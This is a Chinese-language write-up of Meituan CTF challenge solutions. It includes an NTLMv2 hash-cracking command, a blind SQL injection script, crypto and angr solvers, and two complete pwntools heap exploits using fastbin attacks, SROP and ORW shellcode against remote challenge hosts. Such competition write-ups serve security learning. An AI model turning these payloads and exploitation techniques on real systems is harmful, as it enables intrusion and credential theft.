> 原文链接: https://www.anquanke.com//post/id/241813 


# 美团CTF


                                阅读量   
                                **143193**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t014a9f38b3e38a4877.jpg)](https://p0.ssl.qhimg.com/t014a9f38b3e38a4877.jpg)



## Misc

### <a class="reference-link" name="Different_Puzzle"></a>Different_Puzzle

img直接diskgenius 导出<br>
这里通过扇区排序。把png排序扫描

[![](https://p2.ssl.qhimg.com/t0113d72fd1d324af9a.png)](https://p2.ssl.qhimg.com/t0113d72fd1d324af9a.png)

直接就能得到flag.txt

```
from PIL import Image
f=open('list.txt')
str=f.read()
str=str.split('\n')
print(str)
flag=Image.new('RGB',(278,100))
x,y=(0,0)
for i in str:
    img=Image.open(i)
    size=img.size
    print(size)
    flag.paste(img,(x,0))
    x=x+size[0]
flag.show()
```

### <a class="reference-link" name="Find_password"></a>Find_password

在流量包看到许多smb2协议的包，过滤出来可以看出在不停尝试登录：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c933c0d847c252cf.jpg)

在中间有一个包显示登录成功：

[![](https://p2.ssl.qhimg.com/t0108b4447e1cb1b5d6.jpg)](https://p2.ssl.qhimg.com/t0108b4447e1cb1b5d6.jpg)

然后就参照 [https://research.801labs.org/cracking-an-ntlmv2-hash](https://research.801labs.org/cracking-an-ntlmv2-hash) 来复现<br>
构造出ntlmv2：

```
nanming::MicrosoftAccount:6a99833ddd690e7a:980a5dc38aaff466c367eff70bcf80cb:010100000000000042325524355ed601421cb509516bc2e90000000002001e00570049004e002d004f004d004b004100540046003300520047004a00470001001e00570049004e002d004f004d004b004100540046003300520047004a00470004001e00570049004e002d004f004d004b004100540046003300520047004a00470003001e00570049004e002d004f004d004b004100540046003300520047004a0047000700080042325524355ed6010600040002000000080030003000000000000000010000000020000011ac824d212777625c616fadbb6dd0dfaf35a8e4d93f7960ec1eac5592e7cfde0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00330031002e00370035000000000000000000
```

然后用hashcat来爆破，由于文件名为pass%%%%，所以用掩码来爆破：

```
./hashcat -m 5600 -a 3 ntlm.txt pass?a?a?a?a
```

最后爆出来是pass1952，md5一下就是flag



## Web

### <a class="reference-link" name="sql"></a>sql

```
import requests as r
import string

url = ""
sql = "binary(password)"

def str2hex(str):
    ret =""
    for i in range(0, len(str)):
        ret+=hex(ord(str[i]))
    ret = "0x"+ret.replace("0x","")
    return ret

def blindcmp(start,end):
    ret=""
    for i in range(start,end):
        for ch in string.printable:
            payload=f"||left(`{`sql`}`,`{`len(ret+ch)`}`)/**/in(`{`str2hex(ret+ch)`}`)#"
            data =`{`
                "username":"zbrsb\\",
                "password":payload
            `}`
            #print(data)
            req=r.post(url,data=data)
            #print(req.text)
            if (req.status_code != r.codes.ok):
                continue
            #print req.text
            if "flag" in req.text:
                ret=ret+ch
                break
        print(ret)

blindcmp(1,30)
```

sql盲注最后登录就行了。



## Crypto

### <a class="reference-link" name="RSAsig"></a>RSAsig

0day 签名的时候签(bytes_to_long(base64decode(enc_flag)))即可

### <a class="reference-link" name="easy_RSA"></a>easy_RSA

首先一个Related Message Attack

```
sage: def franklinReiter(n,e,b,c1,c2):
....:     R.&lt;X&gt; = Zmod(n)[]
....:     f1 = X^e - c1
....:     f2 = (X + b)^e - c2
....:     m_ = GCD(f1,f2).coefficients()[0] # 返回的是首一多项式，coefficients()
....: 返回多项式各项式的系数，项式次数递增，所以第0项是常数
....:     return Integer(n - m_) # 由于tmp其实是 -m % n,所以这里给他转换回去。
....:
....: def GCD(a, b):
....:     if(b == 0):
....:         return a.monic()^I^I# 返回首一多项式，即多项式最高次的项式系数为1
....:     else:
....:         return GCD(b, a % b)
sage:
sage: n=0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c12
....: 93c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4
....: fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f5
....: 83c9a9710f7e18396fbf461cb31720f94a0f79
....: e=0x3
....: #encrypt(m)
....: c1=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbb
....: d5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489be
....: fab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282
....: d43b10c61b1a1fe76f5fee970780d7512389fd1
....: #encrypt(m+1):
....: c2=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5
....: c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091
....: d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa
....: 77caff991e7b986db844ff7a140218449aaa7e8
sage:
sage: M = franklinReiter(n,e,1,c1,c2)
sage: M
69987496701884177944014408654911578926041003939816261720363083186042632062679566210634401639077276321287225569134
sage: from Crypto.Util.number import *
sage: long_to_bytes(699874967018841779440144086549115789260410039398162617203630
....: 83186042632062679566210634401639077276321287225569134)
b'the key is :everything_is_easy_in_this_question'
sage:
```

然后是一个many times password

明文应该是英文字母加一点标点符号

与2019De1CTF xorz差不多了。

哦，最后一组和有一次00开头的，不好处理，直接扔掉了，只用十组。加密密钥就是flag，最后根据意思猜一猜就好了。

```
import string
def xor(a,b):
    return chr(ord(a)^ord(b))
#000a090f001e491d2c111d3024601405431a36231b083e022c1d,
c='''
280316470206017f5f163a3460100b111b2c254e103715600f13,
091b0f471d05153811122c70340c0111053a394e0b39500f0a18,
4638080a1e49243e55531a3e23161d411a362e4044111f374409,
0e0d15470206017f59122935601405421d3a244e10371560140f,
031a08080e1a540d62327f242517101d4e2b2807177f13280511,
16000406080c543854077f24280144451c2a254e093a0333051a,
02050701120a01334553393f32441d5e1b716027107f19334417,
131f15470800192f5d167f352e0716481e2b29010a7139600c12,
1609411e141c543c501d7f232f0812544e2b2807177f00320b1f,
0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712'''.replace("\n","").split(",")
s = []
for i in c:
    s.append(i.decode('hex'))
key=""
table = string.lowercase+string.uppercase+" ,."
for i in range(len(s[0])):
    for k in range(126):
        check=0
        for j in range(len(s)):
            tmp = xor(chr(k),s[j][i])
            if tmp in table:
                check+=1
        if check == 10:
            print(chr(k))
        else:
            #print check
            pass
    print "="*50


'''
f
==================================================
H
J
K
L
N
O
h
j
k
l
n
o
==================================================
a
==================================================
g
i
k
==================================================
D
G
X
Z
[
d
g
x
z
`{`
==================================================
i
==================================================
t
==================================================
_
==================================================
1
==================================================
s
==================================================
_
==================================================
P
==================================================
@
==================================================
d
==================================================
d
==================================================
1
==================================================
n
==================================================
]
_
==================================================
@
L
==================================================
`
n
==================================================
d
==================================================
_
==================================================
p
==================================================
@
==================================================
d
==================================================
Y
[
\
]
^
y
`{`
|
`}`
==================================================
'''
#flag="flag`{`it_1s_P@dd1n_@nd_p@d`}`"
```

### <a class="reference-link" name="random1"></a>random1

首先解一个lfsr，输出足够多，给了mask，解一个线性方程即可

然后拿着key解密密文就好。

```
'''
#sage

b = open("change2", 'rb').read().decode()[:4]
b_l = []
for i in b:
    for j in bin(ord(i))[2:].rjust(8,"0"):
        b_l.append(j)

output = vector(GF(2),b_l)

A = []

mask = "10100100000010000000100010010001"
for i in range(32):
    B = []
    for j in range(32):
        if j == 31:
            B.append(mask[i])
        elif j == i-1:
            B.append(1)
        else:
            B.append(0)
    A.append(B)
M = matrix(GF(2),A)
M =M^32

key = ""
for i in M.solve_left(output):
    key+=str(i)
print(hex(int(key,2)))

'''
#python2

def key_padding(key):
    k = [0] * 256
    for i in range(256):
        k[i] = key[(i) % len(key)]
    return k


def s_box_a():
    s = []
    for i in range(256):
        s.append(i)
    return s


def s_box(s, key):
    j = 0
    for i in range(256):
        j = (j + s[i] + ord(key[i])) % 256
        s[j], s[i] = s[i], s[j]
    return s



messages = 'WCbeI/BfRYydhk43yF1MIdOk4zPV'.decode('base64')

def main():
    key1='0x1afea246'
    key=[]
    for i in range(len(key1)):
        key.append(key1[i])
    key=key_padding(key)
    sbox=s_box(s_box_a(),key)
    i=j=0
    c=""
    for x in range(len(messages)):
        i = (i+1)%256
        j = (j+sbox[i])%256
        sbox[i],sbox[j]=sbox[j],sbox[i]
        t=(sbox[i]+sbox[j])%128
        c+=chr(ord(messages[x])^sbox[t])
    print c

main()
```

### <a class="reference-link" name="random"></a>random

首先得到ed，n，拿来分解p，q

不知道e，根据 e * inverse(e,phi) == ed 爆一下，最后通过的是65553

然后给了这么多组LCG生成的伪随机数，经典LCG恢复参数，

```
import random
from gmpy2 import gcd
from Crypto.Util.number import *
def factor_n_with_ed(n,ed):  
    p = 1  
    q = 1  
    while p==1 and q==1:  
        k = ed - 1  
        g = random.randint(0,n)  
        while p==1 and q==1 and k % 2 == 0:  
            k /= 2  
            y = pow(g,k,n)  
            if y!=1 and gcd(y-1,n)&gt;1:  
                p = gcd(y-1,n)  
                q = n/p  
    return p,q

n1=3563329754048976946603729466426236052000141166700839903323255268203185709020494450173369806214666850943076188175778667508946270492708397447950521732324059148390232744011000065982865974194986726739638097566303135573072114448615095262066554751858952042395375417151593676621825939069783767865138657768553767717034970
n2=3563121718917234588723786463275555826875232380691165919033718924958406353810813480184744219046717838078497090403751007254545187720107602959381881715875898243474504999760208133192572812110967142474619366650504948619637909653723376917174456091396220576841259798792078769198369072982063716206690589554604992470787752
n = (n1-n2)/2
ed = n1-n
p,q = factor_n_with_ed(n,ed)
phi = (p-1) * (q-1)

for e in range(1,66666):
    if ed % e == 0:
        if e * inverse(e,phi) == ed:
            print(e)
e = 65553        
d = inverse(e,phi)

m = bytes_to_long('you_can_get_more_message')
print(pow(m,d,q))


####################

pri = [3732074616716238200873760199583586585380050413464247806581164994328669362805685831589304096519259751316788496505512L, 8890204100026432347745955525310288219105398478787537287650267015873395979318988753693294398552098138526129849364748L, 3443072315415198209807083608377973177101709911155814986883368551162572889369288798755476092593196361644768257296318L, 4505278089908633319897964655164810526240982406502790229247008099600376661475710376587203809096899113787029887577355L, 9059646273291099175955371969413555591934318289156802314967132195752692549263532407952697867959054045527470269661073L, 3085024063381648326788677294168591675423302286026271441848856369032582049512915465082428729187341510738008226870900L, 8296028984288559154928442622341616376293205834716507766500770482261973424044111061163369828951815135486853862929166L, 2258750259954363171426415561145579135511127336142626306021868972064434742092392644953647611210700787749996466767026L, 4382123130034944542655156575000710851078842295367353943199512878514639434770161602326115915913531417058547954936492L, 10982933598223427852005472748543379913601896398647811680964579161339128908976511173382896549104296031483243900943925L]

from Crypto.Util.number import *

def gcd(a, b):
    while b:
        a, b = b, a%b
    return a


def crack_unknown_increment(states, modulus, multiplier):

    increment = (states[1] - states[0]*multiplier) % modulus
    return modulus, multiplier, increment


def crack_unknown_multiplier(states, modulus):

    multiplier = (states[2] - states[1]) * inverse(states[1] - states[0], modulus) % modulus
    return crack_unknown_increment(states, modulus, multiplier)


def crack_unknown_modulus(states):

    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
    modulus = abs(reduce(gcd, zeroes))
    return crack_unknown_multiplier(states, modulus)


def lcg(seed,params):

    (m,c,n)=params
    x = seed % n
    yield int(x)
    while True:
        x = (m * x + c) % n
        yield int(x)

(n,m,c)=crack_unknown_modulus([int(each) for each in pri])
flag = long_to_bytes(((pri[0]-c) * inverse(m,n))%n)
print flag
```



## Reverse

### <a class="reference-link" name="maze100"></a>maze100

angr跑100层。手动patch点东西就行

```
import angr
import claripy
right_list=[8782, 15581, 22350, 29053, 35792, 42537, 49240, 56189, 62880, 69667, 76244, 82971, 89758, 96521, 103302, 110173, 116984, 123819, 130648, 137603, 144414, 151225, 158102, 164847, 171556, 178343, 185070, 191911, 198746, 205563, 212356, 219161, 225942, 232747, 239516, 246321, 253102, 259901, 266676, 273481, 280298, 287037, 293842, 300605, 307596, 314335, 321092, 327879, 334684, 341609, 348372, 355219, 362108, 368823, 375628, 382373, 389238, 396007, 402716, 409461, 416194, 423065, 429936, 436753, 443618, 450567, 457372, 464141, 471012, 477781, 484652, 491553, 498460, 505301, 512142, 519043, 525770, 532425, 539326, 546185, 552984, 559813, 566660, 573375, 580150, 587015, 593874, 600679, 607604, 614451, 621220, 628079, 634752, 641563, 648482, 655287, 662116, 669017, 675960, 682663]
avoid_list=[[8538, 8719], [15337, 15518], [22106, 22287], [28809, 28990], [35548, 35729], [42293, 42474], [48996, 49177], [55945, 56126], [62636, 62817], [69423, 69604], [76000, 76181], [82727, 82908], [89514, 89695], [96277, 96458], [103058, 103239], [109929, 110110], [116740, 116921], [123575, 123756], [130404, 130585], [137359, 137540], [144170, 144351], [150981, 151162], [157858, 158039], [164603, 164784], [171312, 171493], [178099, 178280], [184826, 185007], [191667, 191848], [198502, 198683], [205319, 205500], [212112, 212293], [218917, 219098], [225698, 225879], [232503, 232684], [239272, 239453], [246077, 246258], [252858, 253039], [259657, 259838], [266432, 266613], [273237, 273418], [280054, 280235], [286793, 286974], [293598, 293779], [300361, 300542], [307352, 307533], [314091, 314272], [320848, 321029], [327635, 327816], [334440, 334621], [341365, 341546], [348128, 348309], [354975, 355156], [361864, 362045], [368579, 368760], [375384, 375565], [382129, 382310], [388994, 389175], [395763, 395944], [402472, 402653], [409217, 409398], [415950, 416131], [422821, 423002], [429692, 429873], [436509, 436690], [443374, 443555], [450323, 450504], [457128, 457309], [463897, 464078], [470768, 470949], [477537, 477718], [484408, 484589], [491309, 491490], [498216, 498397], [505057, 505238], [511898, 512079], [518799, 518980], [525526, 525707], [532181, 532362], [539082, 539263], [545941, 546122], [552740, 552921], [559569, 559750], [566416, 566597], [573131, 573312], [579906, 580087], [586771, 586952], [593630, 593811], [600435, 600616], [607360, 607541], [614207, 614388], [620976, 621157], [627835, 628016], [634508, 634689], [641319, 641500], [648238, 648419], [655043, 655224], [661872, 662053], [668773, 668954], [675716, 675897], [682419, 682600]]
func_list=[1930, 8783, 15582, 22351, 29054, 35793, 42538, 49241, 56190, 62881, 69668, 76245, 82972, 89759, 96522, 103303, 110174, 116985, 123820, 130649, 137604, 144415, 151226, 158103, 164848, 171557, 178344, 185071, 191912, 198747, 205564, 212357, 219162, 225943, 232748, 239517, 246322, 253103, 259902, 266677, 273482, 280299, 287038, 293843, 300606, 307597, 314336, 321093, 327880, 334685, 341610, 348373, 355220, 362109, 368824, 375629, 382374, 389239, 396008, 402717, 409462, 416195, 423066, 429937, 436754, 443619, 450568, 457373, 464142, 471013, 477782, 484653, 491554, 498461, 505302, 512143, 519044, 525771, 532426, 539327, 546186, 552985, 559814, 566661, 573376, 580151, 587016, 593875, 600680, 607605, 614452, 621221, 628080, 634753, 641564, 648483, 655288, 662117, 669018, 675961]
proj=angr.Project('./100mazes',load_options=`{`'auto_load_libs':False`}`)
md5_raw=b''
for i in range(100):
    base=proj.loader.min_addr
    func=func_list[i]+base
    path=claripy.BVS('path',15*8)
    state=proj.factory.blank_state(addr=func,stdin=angr.SimFileStream(name='stdin',content=path,has_end=False))
    for j in range(8):
        state.solver.add(path.get_byte(j)&gt;=32)
        state.solver.add(path.get_byte(j)&lt;=126)
    simgr=proj.factory.simgr(state)
    avoid=[]
    for a in avoid_list[i]:
        avoid.append(a+base)
    simgr.explore(find=right_list[i]+base,avoid=avoid)
    solved=simgr.found[0].posix.dumps(0)
    md5_raw+=solved
assert len(md5_raw)==1500
print(md5_raw)
```



## Pwn

### <a class="reference-link" name="baby_focal"></a>baby_focal

漏洞点在于能够多写16字节，从而覆盖下一块堆块的size字段。由于分配堆块使用的是calloc，所以考虑fastbin attack，可以利用存储堆块的数组中的size字段来伪造出堆块的size字段，从而分配堆块到堆块数组中，配合edit即可实现任意写。

之后我们可以伪造出一块堆块，该堆块与unsorted bin中的堆块重叠，free掉它，然后切分unsorted bin的堆块，使得main arena相关地址移到伪造堆块的fd字段，然后edit修改到stdout，通过爆破我们即可分配堆块到stdout从而泄露出libc地址。

有了地址配合任意写可以将free hook改为setcontext，然后借助mov rdx,[rdi+8]这条gadget完成srop。最后执行orw的shellcode拿到flag。

exp:

```
from pwn import *
#context.log_level='debug'
context.arch='amd64'

def add(index,size):
    sh.sendlineafter('&gt;&gt; ','1')
    sh.sendlineafter('&gt;&gt; ',str(index))
    sh.sendlineafter('&gt;&gt; ',str(size))

def edit(index,content):
    sh.sendlineafter('&gt;&gt; ','2')
    sh.sendlineafter('&gt;&gt; ',str(index))
    if(content):
        sh.sendafter('&gt;&gt; ',content)

def free(index):
    sh.sendlineafter('&gt;&gt; ','3')
    sh.sendlineafter('&gt;&gt; ',str(index))

shellcode = asm('''
    sub rsp, 0x800
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    mov eax, 2
    syscall

    cmp eax, 0
    js failed

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    mov edx, eax
    mov rsi, rsp
    mov edi, 1
    mov eax, edi
    syscall

    jmp exit

    failed:
    push 0x6c696166
    mov edi, 1
    mov rsi, rsp
    mov edx, 4
    mov eax, edi
    syscall

    exit:
    xor edi, edi
    mov eax, 231
    syscall'''
    )

guess='\x5d\x96'
while(True):
    #sh=process('./baby_focal')
    #guess='\x5d'+chr(int(raw_input(':'),16))
    sh=remote('115.28.187.226',32435)
    sh.sendlineafter('input your name: ','velta')

    add(0,0x40)
    free(0)

    for i in range(7):
        add(0,0x250)
        free(0)
    for i in range(7):
        add(0,0x120)
        free(0)
    for i in range(7):
        add(0,0x60)
        free(0)

    add(0,0x60)
    add(1,0x120)

    add(2,0x120)
    add(3,0x20)

    edit(0,p64(0)*13+p64(0x261))
    free(1)

    add(1,0x250)
    edit(1,'\x00'*0x120+p64(0)+p64(0x131)+'\n')

    edit(2,p64(0)*22+p64(0)+p64(0x71)+'\n')
    free(2)
    add(2,0x60)
    free(2)

    edit(1,'\x00'*0x120+p64(0)+p64(0x71)+p64(0x404060)+'\n')    

    free(3)
    add(2,0x60)

    add(3,0x60)
    add(1,0x10)
    edit(3,'\x80'+'\n')
    #pause()
    free(1)
    add(1,0x20)

    edit(3,'\x80'+'\n')
    edit(1,guess+'\n')

    edit(3,p64(0)*2+'\n')
    add(1,0x60)
    try:
        edit(3,p64(0)*2+'\n')
        add(1,0x60)
        edit(1,'\x00'*3+'\x00'*0x30+p64(0xfbad1887)+p64(0)*3+'\x00'+'\n')
    except:
        sh.close()
        continue

    libc_base=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x1eb980
    print(hex(libc_base))
    free_hook=libc_base+0x1EEB28
    free_hook2=free_hook &amp; 0xfffffffffffff000
    pop_rdi=0x401b23
    pop_rsi=0x401b21
    pop_rdx=libc_base+0x11c371
    gadget_addr=libc_base+0x154930
    mprotect=libc_base+0x11BB00
    setcontext=libc_base+0x00000000000580DD
    puts_plt=0x401130
    puts_got=0x403F80
    read_addr=0x401160

    edit(3,p64(free_hook)+p64(0x20)+'\n')
    edit(1,p64(puts_plt)+'\n')
    edit(3,p64(puts_got)+p64(0x20)+'\n')
    free(1)
    sh.recvuntil(']\n')
    puts_addr=u64(sh.recv(6).ljust(8,'\x00'))
    print(hex(puts_addr))

    edit(3,p64(free_hook-0x110)+p64(0x150)+'\n')

    frame=SigreturnFrame()
    frame.rsp = free_hook2
    frame.rdi = 0
    frame.rsi = free_hook2
    frame.rdx = 0x2000
    frame.rip = read_addr

    payload=p64(0)+p64(free_hook-0x100)+p64(0)*4+p64(setcontext)+str(frame)[0x28:0x100]+p64(0)+p64(gadget_addr)

    edit(1,payload+'\n')
    free(1)

    layout=p64(pop_rdi)+p64(free_hook2)+p64(pop_rsi)+p64(0x2000)+p64(0)+p64(pop_rdx)+p64(7)+p64(0)+p64(mprotect)+p64(free_hook2+8*10)
    sh.send(layout+shellcode)
    sh.interactive()
```

### <a class="reference-link" name="zlink"></a>zlink

漏洞点在于序号大于9的堆块分配后写入时存在off by null。我们先在fast bin中布置足够的堆块，使得总大小大于0x510，然后利用分配0xf8和0x500的选项触发fastbin consolidate。从而形成0x510大小堆块，用来制造堆块重叠的堆块，0x100大小堆块这样的布局。我们可以利用中间堆块来off by null修改0x100堆块的prev_inuse位以及pre size字段，之后free即可造成堆块重叠。

重叠之后可以先切分unsorted bin堆块，利用残留的fd泄露出libc基址。然后fastbin attack分配堆块到main arena中，size字段通过堆块地址的最高非0字节伪造，但当该字节为0x55时会报错，需要爆破到为0x56的情况。此时我们可以修改top chunk到free hook上方。最后通过重复分配堆块，直到我们能够修改free hook为setcontext。用之前分配的大量堆块构造srop的payload即可，然后也是用orw的shellcode读出flag。

exp:

```
from pwn import *
context.log_level='debug'
context.arch="amd64"

def add(index,size,content):
    sh.sendafter(':','1')
    sh.sendafter(':',str(index))
    sh.sendafter(':',str(size))
    sh.sendafter(':',content)

def edit(index,content):
    sh.sendafter(':','6')
    sh.sendafter(':',str(index))
    sh.sendafter(':',content)

def free(index):
    sh.sendafter(':','2')
    sh.sendafter(':',str(index))

def show(index):
    sh.sendafter(':','5')
    sh.sendafter(':',str(index))
    sh.recvuntil('Content : ')

def alloc():
    sh.sendafter(':','4')


shellcode = asm('''
    sub rsp, 0x800
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    mov eax, 2
    syscall

    cmp eax, 0
    js failed

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    mov edx, eax
    mov rsi, rsp
    mov edi, 1
    mov eax, edi
    syscall

    jmp exit

    failed:
    push 0x6c696166
    mov edi, 1
    mov rsi, rsp
    mov edx, 4
    mov eax, edi
    syscall

    exit:
    xor edi, edi
    mov eax, 231
    syscall'''
    )

#sh=process('./zlink')
#pause()
sh=remote('115.28.187.226',22435)

for i in range(10):
    add(i,0x70,'a')
add(10,0x40,'a')
add(11,0x70,'a')

for i in range(12):
    free(i)
alloc()

add(0,0x20,'a')
add(1,0x40,'a')
add(2,0x60,'a')
free(15)
add(10,0x38,'a')

edit(10,'a'*0x30+p64(0x580+0x50))
free(14)

add(3,0x70,'a'*8)
show(3)
sh.recv(8)
libc_base=u64(sh.recv(6).ljust(8,'\x00'))-0x3c5018
print(hex(libc_base))
free_hook=libc_base+0x3C67A8#-0xb58
free_hook2=free_hook &amp; 0xfffffffffffff000
read_addr=libc_base+0xf7350#0x00000000000F7350
setcontext=libc_base+0x47B85
arena=libc_base+0x3C4B35-8
pop_rdi=libc_base+0x21112
pop_rsi=libc_base+0x202f8
pop_rdx=libc_base+0x1b92
mprotect=libc_base+0x101870

free(0)

for i in range(7):
    add(i+3,0x70,'a')
add(11,0x6f,'a')
add(12,0x5f,'a')
add(12,0x40,'a')
add(13,0x40,'a')
free(13)
free(12)
free(1)

add(0,0x40,p64(arena))
add(1,0x40,p64(arena))
add(0,0x40,p64(arena))
add(1,0x48,'\x00'*3+p64(0)*7+p64(free_hook-0xb58)[:6])
add(2,0x30,'a')
for i in range(22):
    add(2,0x70,'a')
add(6,0x20,'a')
add(5,0x20,'a')
add(4,0x40,'\x00')

frame=SigreturnFrame()
frame.rsp = free_hook2
frame.rdi = 0
frame.rsi = free_hook2
frame.rdx = 0x2000
frame.rip = read_addr
payload=str(frame)

add(3,0x70,payload[0x50:0x50+0x60])
add(2,0x60,'\x00'*0x48+p64(setcontext))
#pause()
free(4)

layout=p64(pop_rdi)+p64(free_hook2)+p64(pop_rsi)+p64(0x2000)+p64(pop_rdx)+p64(7)+p64(mprotect)+p64(free_hook2+8*8)
sh.send(layout+shellcode)
sh.interactive()
```
